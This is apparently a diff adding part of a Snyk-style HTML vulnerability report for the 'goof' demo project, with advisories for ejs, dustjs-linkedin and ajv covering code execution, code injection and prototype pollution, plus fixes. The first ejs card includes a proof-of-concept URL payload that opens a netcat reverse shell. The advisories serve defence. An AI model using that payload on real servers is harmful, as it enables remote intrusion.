+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            ejs
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                goof@1.0.1 and ejs@1.0.0
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ejs@1.0.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ejs-locals@1.0.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ejs@0.8.8
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/ejs">ejs</a> is a popular JavaScript templating engine.</p>
+        <p>Affected versions of this package are vulnerable to Remote Code Execution (RCE) by passing an unrestricted render option via the <code>view options</code> parameter of <code>renderFile</code>, which makes it possible to inject code into <code>outputFunctionName</code>.</p>
+        <p><strong>Note:</strong>
+        This vulnerability is exploitable only if the server is already vulnerable to Prototype Pollution.</p>
+        <h2 id="poc">PoC:</h2>
+        <p>Creation of reverse shell:</p>
+        <pre><code>http://localhost:3000/page?id=2&amp;settings[view options][outputFunctionName]=x;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;nc -e sh 127.0.0.1 1337&#39;);s
+        </code></pre>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>ejs</code> to version 3.1.7 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf">GitHub Commit</a></li>
+        <li><a href="https://github.com/mde/ejs/issues/451">GitHub Issue</a></li>
+        <li><a href="https://github.com/mde/ejs/releases">GitHub Release</a></li>
+        <li><a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">Security Advisory</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-EJS-2803307">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Arbitrary Code Execution</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            ejs
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                goof@1.0.1 and ejs@1.0.0
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ejs@1.0.0
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ejs-locals@1.0.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ejs@0.8.8
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/ejs"><code>ejs</code></a> is a popular JavaScript templating engine.
+        Affected versions of the package are vulnerable to <em>Remote Code Execution</em> by letting the attacker under certain conditions control the source folder from which the engine renders include files.
+        You can read more about this vulnerability on the <a href="https://snyk.io/blog/fixing-ejs-rce-vuln">Snyk blog</a>.</p>
+        <p>There&#39;s also a <a href="https://snyk.io/vuln/npm:ejs:20161130">Cross-site Scripting</a> &amp; <a href="https://snyk.io/vuln/npm:ejs:20161130-1">Denial of Service</a> vulnerabilities caused by the same behaviour. </p>
+        <h2 id="details">Details</h2>
+        <p><code>ejs</code> provides a few different options for you to render a template, two being very similar: <code>ejs.render()</code> and <code>ejs.renderFile()</code>. The only difference being that <code>render</code> expects a string to be used for the template and <code>renderFile</code> expects a path to a template file.</p>
+        <p>Both functions can be invoked in two ways. The first is calling them with <code>template</code>, <code>data</code>, and <code>options</code>:</p>
+        <pre><code class="language-js">ejs.render(str, data, options);
+        
+        ejs.renderFile(filename, data, options, callback)
+        </code></pre>
+        <p>The second way would be by calling only the <code>template</code> and <code>data</code>, while <code>ejs</code> lets the <code>options</code> be passed as part of the <code>data</code>:</p>
+        <pre><code class="language-js">ejs.render(str, dataAndOptions);
+        
+        ejs.renderFile(filename, dataAndOptions, callback)
+        </code></pre>
+        <p>If used with a variable list supplied by the user (e.g. by reading it from the URI with <code>qs</code> or equivalent), an attacker can control <code>ejs</code> options. This includes the <code>root</code> option, which allows changing the project root for includes with an absolute path.  </p>
+        <pre><code class="language-js">ejs.renderFile(&#39;my-template&#39;, {root:&#39;/bad/root/&#39;}, callback);
+        </code></pre>
+        <p>By passing along the root directive in the line above, any includes would now be pulled from <code>/bad/root</code> instead of the path intended. This allows the attacker to take control of the root directory for included scripts and divert it to a library under his control, thus leading to remote code execution.</p>
+        <p>The <a href="https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6">fix</a> introduced in version <code>2.5.3</code> blacklisted <code>root</code> options from options passed via the <code>data</code> object.</p>
+        <h2 id="disclosure-timeline">Disclosure Timeline</h2>
+        <ul>
+        <li>November 27th, 2016 - Reported the issue to package owner.</li>
+        <li>November 27th, 2016 - Issue acknowledged by package owner.</li>
+        <li>November 28th, 2016 - Issue fixed and version <code>2.5.3</code> released.</li>
+        </ul>
+        <h2 id="remediation">Remediation</h2>
+        <p>The vulnerability can be resolved by either using the GitHub integration to <a href="https://snyk.io/org/projects">generate a pull-request</a> from your dashboard or by running <code>snyk wizard</code> from the command-line interface.
+        Otherwise, Upgrade <code>ejs</code> to version <code>2.5.3</code> or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://snyk.io/blog/fixing-ejs-rce-vuln">Snyk Blog</a></li>
+        <li><a href="https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6">Fix commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/npm:ejs:20161128">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            dustjs-linkedin
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                goof@1.0.1 and dustjs-linkedin@2.5.0
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        dustjs-linkedin@2.5.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/dustjs-linkedin">dustjs-linkedin</a> is a Javascript templating engine designed to run asynchronously on both the server and the browser.</p>
+        <p>Affected versions of this package are vulnerable to Prototype Pollution. It is possible to pollute the <code>blocks</code> Array attribute of the object <code>context</code> within the <code>compileBlocks</code> function. This vulnerability can be leveraged for code execution since  this property is added to the <code>compiled</code> function which is then execute by the <code>vm</code> module.</p>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>_proto_</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>_proto_</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>_proto_.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>dustjs-linkedin</code> to version 3.0.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/linkedin/dustjs/pull/805/commits/ddb6523832465d38c9d80189e9de60519ac307c3">GitHub Commit</a></li>
+        <li><a href="https://github.com/linkedin/dustjs/issues/804">GitHub Issue</a></li>
+        <li><a href="https://github.com/linkedin/dustjs/pull/805">GitHub PR</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-DUSTJSLINKEDIN-1089257">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Code Injection</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            dustjs-linkedin
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+                                goof@1.0.1 and dustjs-linkedin@2.5.0
+        
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        dustjs-linkedin@2.5.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/dustjs-linkedin">dustjs-linkedin</a> is a Javascript templating engine designed to run asynchronously on both the server and the browser.</p>
+        <p>Affected versions of this package are vulnerable to Code Injection. Dust.js uses Javascript&#39;s <code>eval()</code> function to evaluate the &quot;if&quot; statement conditions. The input to the function is sanitized by escaping all potentially dangerous characters.</p>
+        <p>However, if the variable passed in is an array, no escaping is applied, exposing an easy path to code injection. The risk of exploit is especially high given the fact <code>express</code>, <code>koa</code> and many other Node.js servers allow users to force a query parameter to be an array using the <code>param[]=value</code> notation.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>dustjs-linkedin</code> to version 2.6.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://artsploit.blogspot.co.il/2016/08/pprce2.html">Artsploit Blog</a></li>
+        <li><a href="https://github.com/linkedin/dustjs/pull/534/commits/884be3bb3a34a843e6fb411100088e9b02326bd4">GitHub Commit</a></li>
+        <li><a href="https://github.com/linkedin/dustjs/issues/741">GitHub Issue</a></li>
+        <li><a href="https://github.com/linkedin/dustjs/pull/534">GitHub PR</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/npm:dustjs-linkedin:20160819">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            ajv
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    goof@1.0.1, tap@11.1.5 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        goof@1.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        tap@11.1.5
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        coveralls@3.0.9
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        request@2.88.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        har-validator@5.1.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ajv@6.10.2
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/ajv">ajv</a> is an Another JSON Schema Validator</p>
+        <p>Affected versions of this package are vulnerable to Prototype Pollution. A carefully crafted JSON schema could be provided that allows execution of other code by prototype pollution. (While untrusted schemas are recommended against, the worst case of an untrusted schema should be a denial of service, not execution of code.)</p>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>_proto_</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>_proto_</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>_proto_.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>ajv</code> to version 6.12.3 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://hackerone.com/bugs?subject=user&amp;report_id=894259">HackerOne Report</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-AJV-584908">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+      </div><!-- cards -->
+    </div>
+  </main><!-- .layout-stacked__content -->
+</body>
+
+</html>
